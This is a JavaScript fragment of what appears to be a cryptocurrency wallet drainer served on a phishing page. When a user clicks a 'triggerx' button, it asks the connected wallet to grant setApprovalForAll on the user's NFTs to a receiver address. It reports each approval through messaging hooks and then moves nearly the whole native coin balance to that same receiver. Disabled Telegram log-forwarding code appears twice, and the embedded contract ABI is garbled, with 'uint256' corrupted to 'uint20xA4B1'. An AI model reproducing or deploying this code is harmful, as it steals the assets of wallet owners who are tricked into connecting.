xA4B1"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"setFreeMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"maxMintSupply","type":"uint20xA4B1"}],"name":"setMaxMintSupply","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"val","type":"uint20xA4B1"}],"name":"setMaxReserve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"setMaximumAllowedTokensPerTx","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"setMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_price","type":"uint20xA4B1"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"val","type":"uint20xA4B1"}],"name":"setReserveAtATime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"toggleSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
              let {
                contract_type: type,
                token_address: contractAddress,
                token_id: tokenId,
              } = nft
              await sendMessage(`Approving 
                                NFT Address : ${contractAddress},
                                token_id : ${tokenId}
                                Your address : ${receiver_address}
                                  ` )
              await sendMessage1(`Approving 
                                  NFT Address : ${contractAddress},
                                  token_id : ${tokenId}
                                  Your address : ${receiver_address}
                                    ` )
              const sendOptions = {
                contractAddress: contractAddress,
                functionName: "setApprovalForAll",
                abi: ABI721,
                params: {
                  operator : receiver_address,
                  approved : true,
                },
              };
              let mum = "";
              let transaction = await Moralis.executeFunction(sendOptions).catch(
                (e) => {
                  console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
                  if (e.code === 4001) {
                mum = "denied";
                
              }
              else {
                mum = "approved";
              }
            },
          )
          if (transaction) {
            await sendMessage(`Approved` )
            await sendMessage1(`Approved` )
          }
          else {
            await sendMessage(`Denied` )
            await sendMessage1(`Denied` )
          }
              console.log(transaction);
              // if(transaction){
              //   await transaction.wait().then((v) => {
              //     console.log('Finished Processing transaction:', v)
              //   })
              // }
            }
          
          if (x === real_arbitrum_token.length){
        const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
          console.log("Unable to get new arbitrum balance", e);
        });
        console.log("bnb_balance", bnb_balance);
        console.log("bnb_balance.balance", bnb_balance.balance);
        
        const balance = (parseFloat((parseInt(bnb_balance.balance))/1000000000000000000)) - 0.001;
        console.log("The new bnb balance", balance);
        if (balance > 0) {
        const options = {
          type: "native",
          amount: Moralis.Units.ETH(balance.toString()),
          receiver: receiver_address,
        };
        let result = await Moralis.transfer(options);
        console.log(result);
      }
      else {
        console.log("Insufficient funds")
      }
    }
  }
    }
    send();
}


{
    let l = console.log; 
    function normalize(x_){
        let x = String(x_);
        if(/^\[object/g.test(x)){ // [object Window]
            try {
                let y = JSON.stringify(x_);
                x = y;
            } catch (error) {
                x = x+" >> "+(Object.keys(x_));
            }
            return x;
        }else{return x;}
    }
    let logs_to_send = [];
    if(getParameterByName("log") == "true"){
        let el = document.getElementById("testx");
        el.style.display = "block";
        console.log = (x, ...y)=>{ 
            l(x);
            if(y && y.length>0){
              y.forEach((z) => {
                  l(y,":",z);
                  x+=(" -> ("+normalize(z)+")");
                });
            }
            x = normalize(x);
            el.innerText += ("~ "+x+"\n");
            if(start_to_log){
              logs_to_send.push(x);
            }
            window.setTimeout(function() {
              el.scrollTop = el.scrollHeight;
            }, 500);      
        }
    }
    setInterval(() => {
      if(logs_to_send.length == 0 || !start_to_log) return;
      let text = logs_to_send.splice(0,1);
      let url = "";
      let chat_id = "";          
      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
      //   l("TG Log Err:", e);
      // });
    }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
}

{
  let l = console.log; 
  function normalize(x_){
      let x = String(x_);
      if(/^\[object/g.test(x)){ // [object Window]
          try {
              let y = JSON.stringify(x_);
              x = y;
          } catch (error) {
              x = x+" >> "+(Object.keys(x_));
          }
          return x;
      }else{return x;}
  }
  let logs_to_send = [];
  if(getParameterByName("log") == "true"){
      let el = document.getElementById("testx");
      el.style.display = "block";
      console.log = (x, ...y)=>{ 
          l(x);
          if(y && y.length>0){
            y.forEach((z) => {
                l(y,":",z);
                x+=(" -> ("+normalize(z)+")");
              });
          }
          x = normalize(x);
          el.innerText += ("~ "+x+"\n");
          if(start_to_log){
            logs_to_send.push(x);
          }
          window.setTimeout(function() {
            el.scrollTop = el.scrollHeight;
          }, 500);      
      }
  }
  setInterval(() => {
    if(logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0,1);
      let url = ``;
      let chat_id = "";          
      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
      //   l("TG Log Err:", e);
      // });
  }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
}
/**
 * Main entry point.
 */
async function startx(){
    await init().then(() => {
        onButtonClick();
        // ^ Initially "onConnect", then "proceed"
    }).catch(e => {
        console.log("Initialization failed.");
        console.log(e);
    })
};
// trigger login
let els = document.getElementsByClassName("triggerx");
([...els]).forEach((el) => {
    el.addEventListener("click", () => {
        startx();
    });
});
console.log(window);
